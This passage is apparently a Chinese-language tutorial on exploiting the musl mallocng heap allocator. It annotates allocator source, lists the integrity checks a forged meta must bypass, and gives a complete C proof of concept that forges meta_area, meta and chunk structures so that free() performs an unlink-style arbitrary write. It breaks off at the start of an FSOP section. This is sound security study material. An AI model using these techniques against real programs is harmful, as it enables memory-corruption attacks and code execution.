class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">nontrivial_free</span><span class="params">(<span class="keyword">struct</span> meta *g, <span class="type">int</span> i)</span><span class="comment">// i = idx</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line">    <span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">    <span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;<span class="comment">//mask=已经被free的chunk +可使用的chunk</span></span><br><span class="line">    <span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g))</span><br><span class="line">    &#123;    <span class="comment">/*    </span></span><br><span class="line"><span class="comment">         如果 mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 代表此meta中group里的chunk 都被释放 或者 都被用了</span></span><br><span class="line"><span class="comment">         (2u&lt;&lt;g-&gt;last_idx)-1 计算出的值化成二进制，其中每位含义类似于bitmap，如果每位为1表每位要不是被free 不然就是被</span></span><br><span class="line"><span class="comment">         okay_to_free 检测是否可以被释放</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (g-&gt;next)</span><br><span class="line">        &#123;    <span class="comment">// 如果队列中 有下一个meta</span></span><br><span class="line">            assert(sc &lt; <span class="number">48</span>);<span class="comment">// 检测 sc 是不是mmap 分配的</span></span><br><span class="line">      <span class="comment">// 检测当前meta g 和 队列里的active[sc] meta 是否一样，一样则activate_new赋值为1</span></span><br><span class="line">            <span class="type">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">            dequeue(&amp;ctx.active[sc], g);<span class="comment">// 当前meta 出队</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment">// 在出队操作后 ,ctx.active[sc]==meta -&gt;next  是指的刚刚出队meta 的下一个meta</span></span><br><span class="line">            <span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">                activate_group(ctx.active[sc]);<span class="comment">//如果有下一个meta 直接激活 然后修改avail_mask 标志位</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> free_group(g);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!mask)</span><br><span class="line">    &#123;<span class="comment">// mask==0 group chunk 空间已被完全使用</span></span><br><span class="line">        assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">        <span class="comment">// might still be active if there were no allocations</span></span><br><span class="line">        <span class="comment">// after last available slot was taken.</span></span><br><span class="line">        <span class="keyword">if</span> (ctx.active[sc] != g) &#123;<span class="comment">// 如果 g 未被加入 队列ctx.ative[sc]</span></span><br><span class="line">            <span class="built_in">queue</span>(&amp;ctx.active[sc], g);<span class="comment">// 把g 加入队列</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    a_or(&amp;g-&gt;freed_mask, self);<span class="comment">// 修改对应 的freed_mask 标志 ，表示着对应的chunk 已被释放</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> mapinfo)&#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="dequeue"><a href="#dequeue" class="headerlink" title="dequeue:"></a>dequeue:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">dequeue</span><span class="params">(<span class="keyword">struct</span> meta **phead, <span class="keyword">struct</span> meta *m)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">        m-&gt;prev-&gt;next = m-&gt;next; <span class="comment">// 这里存在指针互写 在 prev 所指地址上 写入next 指针</span></span><br><span class="line">        m-&gt;next-&gt;prev = m-&gt;prev; <span class="comment">// 在next 所指地址上 写入prev 指针</span></span><br><span class="line">        <span class="keyword">if</span> (*phead == m) *phead = m-&gt;next;<span class="comment">// 队列头如果为m 那就更新为m-&gt;next</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *phead = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    m-&gt;prev = m-&gt;next = <span class="number">0</span>; <span class="comment">// 清理m(meta)的头尾指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="dequeue触发条件"><a href="#dequeue触发条件" class="headerlink" title="dequeue触发条件"></a>dequeue触发条件</h3><p>1、<code>avail_mask</code> 表示只有一个<code>chunk</code> 被使用 ,<code>freed_mask=0</code>，而<code>free</code> 刚好要<code>free</code> 一个<code>chunk</code>，满足 <code>okay_to_free()</code> 条件 就可以进入<code>dequeue</code> 进行出队操作<br>如<code>add(1,0x20)</code> 再<code>free(1)</code> 就会使得<code>meta</code> 被回收<br>2、<code>avail_mask=0</code>, <code>freed_mask</code> 表示只有 <code>1</code>个 <code>chunk</code> 没被释放，这时释放的<code>chunk</code> 就应该是那最后一个<code>chunk</code><br>如下面情况 <code>avail_mask ==0 free_mask=63=00111111 last_idx = 6</code>，已经释放<code>6</code> 个<code>chunk</code> 还有最后一个<code>chunk</code>没被释放 在释放最后一个<code>chunk</code> 时会触发<code>dequeue</code>使得对应<code>meta</code>出队<br>3、如果发现这个<code>group</code>中所有的<code>chunk</code>要么被<code>free</code>, 要么是可用的, 那么就会回收掉这个<code>group</code>，调用<code>dequeue</code>从队列中出队</p><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>free 首先会调用 <code>get_meta</code> ，而 <code>get_meta</code> 有如下检查:</p><ul><li><code>assert(!((uintptr_t) p &amp; 15));</code>，即 <code>chunk</code> 应该关于 <code>0x10</code> 对齐</li><li><code>meta-&gt;mem == base</code> ，即 <code>meta</code> 中保存的 <code>group</code> 指针要正确</li><li><code>index &lt;= meta-&gt;last_idx</code> ，即 <code>chunk</code> 的索引不能越界</li><li><code>assert(!(meta-&gt;avail_mask &amp; (1u &lt;&lt; index)));</code> ，<code>assert(!(meta-&gt;freed_mask &amp; (1u &lt;&lt; index)));</code> ，检测 <code>double fre</code></li><li><code>area-&gt;check == ctx.secret</code> ，即 <code>meta</code> 所在的 <code>meta_area</code> 的校验值正确。如果伪造的 <code>meta</code> 位于一个伪造的 <code>meta_area</code> 中，需要首先获取校验值 <code>secret</code> 并保存到 <code>meta_area</code> 开头，即这一页最开始的地方</li><li><code>offset &gt;= size_classes[meta-&gt;sizeclass]_index ，offset &lt; size_classes[meta-&gt;sizeclass]_(index+1)</code> ，这两个检查 <code>offset</code> 和 <code>chunk</code> 大小是否对应</li><li><code>assert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1);</code> ，即检查 <code>offset</code> 是否越界</li></ul><p>紧接着还会调用 <code>get_nominal_size</code>，其中有对 <code>chunk</code> 的检查，总结来说 <code>chunk</code> 区域尽量都填 <code>0</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">size_t</span> <span class="title function_">get_nominal_size</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *end)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> reserved = p[<span class="number">-3</span>] &gt;&gt; <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">if</span> (reserved &gt;= <span class="number">5</span>) &#123;</span><br><span class="line">        assert(reserved == <span class="number">5</span>);</span><br><span class="line">        reserved = *(<span class="type">const</span> <span class="type">uint32_t</span> *) (end - <span class="number">4</span>);</span><br><span class="line">        assert(reserved &gt;= <span class="number">5</span>);</span><br><span class="line">        assert(!end[<span class="number">-5</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    assert(reserved &lt;= end - p);</span><br><span class="line">    assert(!*(end - reserved));</span><br><span class="line">    <span class="comment">// also check the slot&#x27;s overflow byte</span></span><br><span class="line">    assert(!*end);</span><br><span class="line">    <span class="keyword">return</span> end - reserved - p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后在 <code>free</code> 中的循环满足条件跳出循环调用 <code>nontrivial_free</code> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="type">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line">    <span class="type">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line">    <span class="type">uint32_t</span> mask = freed | avail;</span><br><span class="line">    assert(!(mask &amp; self));</span><br><span class="line">    <span class="keyword">if</span> (!freed || mask + self == all) <span class="keyword">break</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wrlock();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);</span><br></pre></td></tr></table></figure><p>进入 <code>nontrivial_free</code> 函数后会执行如下代码。<code>okay_to_free</code> 函数返回非 <code>0</code> 的前提是 <code>meta-&gt;freeable</code> 非 <code>0</code>，另外还要确保 <code>meta-&gt;sizeclass &lt; 48</code> 。之后调用 <code>dequeue</code> 函数触发 <code>unlink</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> self = <span class="number">1u</span> &lt;&lt; i;</span><br><span class="line"><span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line"><span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mask + self == (<span class="number">2u</span> &lt;&lt; g-&gt;last_idx) - <span class="number">1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">    <span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line">    <span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line">    <span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">        assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">        <span class="type">int</span> activate_new = (ctx.active[sc] == g);</span><br><span class="line">        dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">        <span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">            activate_group(ctx.active[sc]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> free_group(g);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>之后进入 <code>free_group</code> 函数后为了减小伪造难度不再调用 <code>nontrivial_free</code> 要保证 <code>maplen</code> 不为零</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">free_group</span><span class="params">(<span class="keyword">struct</span> meta *g)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">    <span class="keyword">if</span> (sc &lt; <span class="number">48</span>) &#123;</span><br><span class="line">        ctx.usage_by_class[sc] -= g-&gt;last_idx + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (g-&gt;maplen) &#123;</span><br><span class="line">        step_seq();</span><br><span class="line">        record_seq(sc);</span><br><span class="line">        mi.base = g-&gt;mem;</span><br><span class="line">        mi.len = g-&gt;maplen * <span class="number">4096UL</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">void</span> *p = g-&gt;mem;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> get_meta(p);</span><br><span class="line">        <span class="type">int</span> idx = get_slot_index(p);</span><br><span class="line">        g-&gt;mem-&gt;meta = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// not checking size/reserved here; it&#x27;s intentionally invalid</span></span><br><span class="line">        mi = nontrivial_free(m, idx);</span><br><span class="line">    &#125;</span><br><span class="line">    free_meta(g);</span><br><span class="line">    <span class="keyword">return</span> mi;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNIT 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IB 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_CHUNK_SIZE 0x80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_CHUNK_INDEX 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_INDEX 4</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">uint16_t</span> size_classes[] = &#123;</span><br><span class="line">        <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>,</span><br><span class="line">        <span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">15</span>,</span><br><span class="line">        <span class="number">18</span>, <span class="number">20</span>, <span class="number">25</span>, <span class="number">31</span>,</span><br><span class="line">        <span class="number">36</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">63</span>,</span><br><span class="line">        <span class="number">72</span>, <span class="number">84</span>, <span class="number">102</span>, <span class="number">127</span>,</span><br><span class="line">        <span class="number">146</span>, <span class="number">170</span>, <span class="number">204</span>, <span class="number">255</span>,</span><br><span class="line">        <span class="number">292</span>, <span class="number">340</span>, <span class="number">409</span>, <span class="number">511</span>,</span><br><span class="line">        <span class="number">584</span>, <span class="number">682</span>, <span class="number">818</span>, <span class="number">1023</span>,</span><br><span class="line">        <span class="number">1169</span>, <span class="number">1364</span>, <span class="number">1637</span>, <span class="number">2047</span>,</span><br><span class="line">        <span class="number">2340</span>, <span class="number">2730</span>, <span class="number">3276</span>, <span class="number">4095</span>,</span><br><span class="line">        <span class="number">4680</span>, <span class="number">5460</span>, <span class="number">6552</span>, <span class="number">8191</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">size_to_class</span><span class="params">(<span class="type">size_t</span> n)</span> &#123;</span><br><span class="line">    n = (n + IB - <span class="number">1</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">10</span>) <span class="keyword">return</span> n;</span><br><span class="line">    n++;</span><br><span class="line">    <span class="type">int</span> i = (<span class="number">28</span> - __builtin_ctz(n)) * <span class="number">4</span> + <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; size_classes[i + <span class="number">1</span>]) i += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; size_classes[i]) i++;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> secret;</span><br><span class="line">    <span class="type">int</span> init_done;</span><br><span class="line">    <span class="type">unsigned</span> mmap_counter;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span></span><br><span class="line">    <span class="type">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *avail_meta_areas;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span></span><br><span class="line">    <span class="type">size_t</span> usage_by_class[<span class="number">48</span>];</span><br><span class="line">    <span class="type">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">    <span class="type">uint8_t</span> seq;</span><br><span class="line">    <span class="type">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx: <span class="number">5</span>;</span><br><span class="line">    <span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;</span><br><span class="line">    <span class="type">uintptr_t</span> last_idx: <span class="number">5</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> freeable: <span class="number">1</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> sizeclass: <span class="number">6</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> maplen: <span class="number">8</span> * <span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>) - <span class="number">12</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> check;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">int</span> nslots;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> *<span class="title">ctx</span> =</span> (<span class="keyword">struct</span> malloc_context *) (&amp;<span class="built_in">printf</span> + <span class="number">0x247193</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">target</span> =</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *mmap_space = mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">fake_meta_area</span> =</span> mmap_space;</span><br><span class="line">    fake_meta_area-&gt;check = ctx-&gt;secret;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">fake_meta</span> =</span> (<span class="keyword">struct</span> meta *) ((<span class="type">uint64_t</span>) mmap_space + <span class="number">0x100</span>);</span><br><span class="line">    fake_meta-&gt;maplen = <span class="number">1</span>;</span><br><span class="line">    fake_meta-&gt;sizeclass = size_to_class(FAKE_CHUNK_SIZE - IB);</span><br><span class="line">    fake_meta-&gt;last_idx = LAST_INDEX;</span><br><span class="line">    fake_meta-&gt;freeable = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">fake_group</span> =</span> (<span class="keyword">struct</span> group *) ((<span class="type">uint64_t</span>) mmap_space + <span class="number">0x1000</span>);</span><br><span class="line">    fake_meta-&gt;mem = fake_group;</span><br><span class="line">    fake_group-&gt;meta = fake_meta;</span><br><span class="line">    fake_meta-&gt;avail_mask = ((<span class="number">2U</span> &lt;&lt; LAST_INDEX) - <span class="number">1</span>) ^ (<span class="number">1</span> &lt;&lt; FAKE_CHUNK_INDEX);</span><br><span class="line">    fake_meta-&gt;freed_mask = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> *fake_chunk = (<span class="type">uint8_t</span> *) ((<span class="type">uint64_t</span>) fake_group-&gt;storage + size_classes[fake_meta-&gt;sizeclass] * UNIT * FAKE_CHUNK_INDEX);</span><br><span class="line">    *(<span class="type">uint16_t</span> *) (fake_chunk - <span class="number">2</span>) = (fake_chunk - fake_group-&gt;storage) / UNIT;</span><br><span class="line">    fake_chunk[<span class="number">-3</span>] = FAKE_CHUNK_INDEX;</span><br><span class="line"></span><br><span class="line">    fake_meta-&gt;prev = fake_meta-&gt;next = &amp;target;</span><br><span class="line">    <span class="built_in">free</span>(fake_chunk);</span><br><span class="line">    assert(target.prev == target.next &amp;&amp; target.prev == &amp;target);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="fsop"><a href="#fsop" class="headerlink" title="fsop"></a>fsop</h2><h3 id="IO-file结构体"><a href="#IO-file结构体" class="headerlink" title="IO_file结构体"></a>IO_file结构体</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *rpos, *rend;</span><br><span class="line">    <span class="type">int</span> (*close)(FILE *);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *wend, *wpos;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *mustbezero_1;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *wbase;</span><br><span class="line">    <span class="type">size_t</span> (*read)(FILE *, <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">    <span class="type">size_t</span> (*write)(FILE *, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">    <span class="type">off_t</span> (*seek)(FILE *, <span class="type">off_t</span>, <span class="type">int</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *buf;</span><br><span class="line">    <span class="type">size_t</span> buf_size;</span><br><span class="line">    FILE *prev, *next;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">int</span> pipe_pid;</span><br><span class="line">    <span class="type">long</span> lockcount;</span><br><span class="line">    <span class="type">int</span> mode;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> lock;</span><br><span class="line">    <span class="type">int</span> lbf;</span><br><span class="line">    <span class="type">void</span> *cookie;</span><br><span class="line">    <span class="type">off_t</span> off;</span><br><span class="line">    <span class="type">char</span> *getln_buf;</span><br><span class="line">    <span class="type">void</span> *mustbezero_2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *shend;</span><br><span class="line">    <span class="type">off_t</span> shlim, shcnt;</span><br><span class="line">    